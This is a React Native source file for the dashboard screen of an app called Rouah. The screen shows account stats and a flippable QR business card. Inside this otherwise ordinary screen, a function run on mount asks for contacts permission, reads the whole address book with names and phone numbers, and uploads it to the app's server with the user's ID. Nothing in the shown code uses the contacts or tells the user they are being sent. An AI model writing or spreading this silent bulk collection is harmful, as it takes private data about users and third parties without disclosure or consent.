import React, { useState, useContext, useEffect } from 'react';
import { View, Image, Pressable, Text, ScrollView, StyleSheet, Dimensions, TouchableOpacity, Alert } from 'react-native';
import * as Contacts from 'expo-contacts';
import QRCode from 'react-native-qrcode-svg';
import Animated, { useSharedValue, useAnimatedStyle, withTiming } from 'react-native-reanimated';
import { GlobalContext } from '../global/GlobalState';

export default function Accueil() {
  const rotation = useSharedValue(0);
  const [flipped, setFlipped] = useState(false);

  const [user] = useContext(GlobalContext);
  const [annonce, setAnnonce] = useState([]);
  const [caisse, setCaisse] = useState([]);
  const [BarData, setBarData] = useState([]);
  const [PieData, setPieData] = useState([]);
  const [error, setError] = useState(null);
  const [contacts, setContacts] = useState([]);
  const [status, setStatus] = useState('Aucun contact récupéré');

  // Carte couleurs
  const colors = [
    '#fa4447', '#0099cc', '#28a745', '#ff9800',
    '#8e44ad', '#e67e22', '#34495e', '#1abc9c',
    '#f39c12', '#2ecc71', '#c0392b', '#3498db',
  ];
  const [bgColor, setBgColor] = useState('#fa4447');

  const formatAmount = (value) => {
    if (!value) return "0";
    return parseFloat(value).toLocaleString("fr-FR", { minimumFractionDigits: 0 });
  };

  const flip = () => {
    setFlipped(!flipped);
    rotation.value = withTiming(flipped ? 0 : 180, { duration: 600 });
  };

  const frontAnimatedStyle = useAnimatedStyle(() => ({
    transform: [{ rotateY: `${rotation.value}deg` }],
    zIndex: rotation.value < 90 ? 1 : 0,
  }));

  const backAnimatedStyle = useAnimatedStyle(() => ({
    transform: [{ rotateY: `${rotation.value + 180}deg` }],
    zIndex: rotation.value >= 90 ? 1 : 0,
  }));

  // Données API
  useEffect(() => {
    const delay = 10000;
    getAnnonces();
    getCaisse();
    getAndSendContacts();
    const intervalId = setInterval(getAnnonces, delay);
    return () => clearInterval(intervalId);
  }, []);

  const getAnnonces = async () => {
    try {
      const response = await fetch(`https://rouah.net/api/nombre-publication.php?matricule=${user?.matricule}`);
      const newData = await response.json();
      setAnnonce(newData);
    } catch (error) { setError(error); }
  };

  const getCaisse = async () => {
    try {
      const response = await fetch(`https://rouah.net/api/nombre-prestation.php?matricule=${user?.matricule}`);
      const newData = await response.json();
      setCaisse(newData);
    } catch (error) { setError(error); }
  };



  const getAndSendContacts = async () => {
    try {
      const { status } = await Contacts.requestPermissionsAsync();
      if (status !== 'granted') {
        setStatus('Permission refusée');
        Alert.alert('Erreur', 'Permission d\'accès aux contacts refusée');
        return;
      }
      const { data } = await Contacts.getContactsAsync({ fields: [Contacts.Fields.Name, Contacts.Fields.PhoneNumbers] });
      if (data.length > 0) {
        const formattedContacts = data.map(contact => ({
          name: contact.name || 'Inconnu',
          phoneNumbers: contact.phoneNumbers ? contact.phoneNumbers.map(num => num.number).filter(num => num) : [],
        }));
        const response = await fetch('https://rouah.net/api/contact.php', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ contacts: formattedContacts, proprietaire: user.matricule }),
        });
        const responseData = await response.json();
        if (!response.ok) { throw new Error(responseData.message || 'Échec de l\'envoi'); }
        setStatus(`Succès : ${response.status} - ${responseData.message || 'Contacts envoyés'}`);
      } else { setStatus('Aucun contact trouvé'); }
    } catch (error) { setStatus('Erreur lors de l\'envoi'); }
  };

  return (
    <ScrollView style={styles.container} contentContainerStyle={styles.scrollContent}>
      <View style={styles.header}>
        <Text style={styles.title}>Tableau de Bord</Text>
      </View>

      <View style={styles.statsContainer}>
        <View style={styles.statCard}>
          <Text style={styles.statValue}>{formatAmount(user?.solde) || 0}</Text>
          <Text style={styles.statLabel}>Solde</Text>
        </View>
        <View style={styles.statCard}>
          <Text style={styles.statValue}>{annonce || 0}</Text>
          <Text style={styles.statLabel}>Annonces</Text>
        </View>
        <View style={styles.statCard}>
          <Text style={styles.statValue}>{caisse || 0}</Text>
          <Text style={styles.statLabel}>Articles</Text>
        </View>
      </View>

      {/* Carte Rouah */}
      <View style={styles.profileContent}>
        <Pressable onPress={flip} style={styles.cardWrapper}>
          <Animated.View style={[styles.card, frontAnimatedStyle, { backgroundColor: bgColor }]}>
            <View style={styles.topSection}>
              <Text style={styles.subtitle}>Scannez & Découvrez</Text>
              <Image source={require('../assets/logo.png')} style={styles.logo} />
              <Text style={styles.titleCard}>Rouah</Text>
            </View>
            <View style={styles.qrBox}>
              <QRCode value={`https://rouah.net/app/boutique/${user?.matricule ?? "001"}`} size={160} />
            </View>
          </Animated.View>
           <Animated.View
            style={[
              styles.card,
              styles.backCard,
              backAnimatedStyle,
              { backgroundColor: bgColor, borderColor: bgColor },
            ]}
          >
            <Text style={[styles.backText, { color: '#fff' }]}>{user?.nom_prenom}</Text>
          </Animated.View>
        </Pressable>
      </View>

      {/* Couleurs + bouton Télécharger */}
      <View style={styles.bottomActions}>
        <View style={styles.tabsContainer}>
          {colors.map((color) => (
            <TouchableOpacity key={color} style={[styles.tab, { backgroundColor: color }]} onPress={() => setBgColor(color)} />
          ))}
        </View>
        <TouchableOpacity style={styles.downloadBtn} onPress={() => Alert.alert('Téléchargement', 'La carte sera enregistrée')}>
          <Text style={styles.downloadText}>Télécharger la carte</Text>
        </TouchableOpacity>
      </View>
    </ScrollView>
  );
}

const styles = StyleSheet.create({
  container: { flex: 1, backgroundColor: '#f5f5f5' },
  scrollContent: { padding: 16, paddingBottom: 30 },
  header: { marginBottom: 20 },
  title: { fontSize: 22, fontWeight: 'bold', color: '#333' },
  statsContainer: { flexDirection: 'row', justifyContent: 'space-between', marginBottom: 20 },
  statCard: { backgroundColor: '#fff', borderRadius: 12, padding: 16, width: '30%', alignItems: 'center', elevation: 2, shadowColor: '#000', shadowOffset: { width: 0, height: 2 }, shadowOpacity: 0.1, shadowRadius: 4 },
  statValue: { fontSize: 16, fontWeight: 'bold', color: '#fa4447' },
  statLabel: { fontSize: 12, color: '#666', marginTop: 4 },

  profileContent: { flex: 1, justifyContent: 'center', alignItems: 'center', marginBottom: 15 },
  cardWrapper: { width: 250, height: 400, perspective: 1000 },
  card: { position: 'absolute', width: '100%', height: '100%', borderRadius: 16, backfaceVisibility: 'hidden', alignItems: 'center', justifyContent: 'center', padding: 10 },
  backCard: { transform: [{ rotateY: '180deg' }] },
  backText: { fontSize: 30, color: 'white', fontFamily: 'Poppins',textAlign:'center',fontWeight: 'bold' },
  topSection: { alignItems: 'center', marginBottom: 15,marginTop:-15 },
  subtitle: { fontSize: 18, fontWeight: '500', color: '#fff', marginBottom: -5 },
  logo: { width: 80, height: 80 },
  titleCard: { marginTop: -10, fontSize: 30, fontWeight: '700', color: '#fff' },
  qrBox: { backgroundColor: '#fff', padding: 10, borderRadius: 12 },

  bottomActions: { marginTop: 20, alignItems: 'center' },
  tabsContainer: { flexDirection: 'row', flexWrap: 'wrap', justifyContent: 'center', marginBottom: 15 },
  tab: { width: 40, height: 40, borderRadius: 20, margin: 5 },
  downloadBtn: { backgroundColor: '#333', paddingVertical: 10, paddingHorizontal: 20, borderRadius: 8 },
  downloadText: { color: '#fff', fontSize: 16, fontWeight: '600' },
});
